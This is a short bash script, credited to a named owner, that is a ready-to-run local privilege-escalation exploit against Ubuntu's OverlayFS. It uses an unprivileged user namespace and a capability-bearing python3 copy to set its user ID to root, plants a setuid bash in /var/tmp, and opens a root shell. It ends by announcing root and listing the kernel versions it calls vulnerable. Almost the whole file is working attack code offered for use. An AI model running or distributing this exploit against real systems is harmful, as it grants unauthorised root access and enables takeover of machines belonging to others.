#!/bin/bash

#Owner: Sanjay Ragavendar

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'

echo "You must be root now"
echo "If not check the version"
echo "Vulnerable versions Ubuntu 6.2.0 5.19.0 5.4.0"
